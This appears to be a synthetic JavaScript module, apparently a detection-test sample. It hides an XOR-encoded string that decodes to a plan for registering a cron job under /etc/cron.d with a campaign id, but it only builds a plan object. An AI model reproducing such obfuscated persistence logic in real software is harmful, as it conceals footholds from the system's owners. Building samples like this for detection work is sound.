  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_580bb5c9 = "[94,21,25,84,91,92,77,88,91,21,74,93,65,68,76,119,91,75,64,77,76,93,68,77,4,90,77,79,65,91,92,77,90,119,76,77,91,75,90,65,88,92,71,90,84,73,76,73,88,92,77,90,21,75,90,71,70,119,76,77,91,75,90,65,88,92,71,90,84,91,92,73,79,77,119,75,71,93,70,92,21,25,84,75,73,69,88,73,65,79,70,119,65,76,21,102,103,108,109,5,24,26,106,17,17,27,110,24,84,91,75,64,77,76,93,68,77,119,88,73,92,64,21,7,77,92,75,7,75,90,71,70,6,76,7,70,71,76,77,5,24,26,74,17,17,27]";
  const Codec_580bb5c9 = "json_numbers|single_byte_xor|28";

  function load_580bb5c9() { return JSON.parse(Material_580bb5c9); }
  function decode_580bb5c9(EnCoDeD) { return EnCoDeD.map((value) => value ^ 40); }
  async function recover_580bb5c9() {
    const NeUtRaL = "";
    const EnCoDeD = load_580bb5c9(); let DeCoDeD = [];
    let PaSs = 0; while (PaSs++ < 1) DeCoDeD = decode_580bb5c9(EnCoDeD);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_580bb5c9() { return (await recover_580bb5c9()).split("|").join("|"); }
  async function plan_580bb5c9() { const inspect = inspect_580bb5c9; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "cron_descriptor", path: fields.schedule_path }); }
  void moduleShape; void plan_580bb5c9;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_580bb5c9());
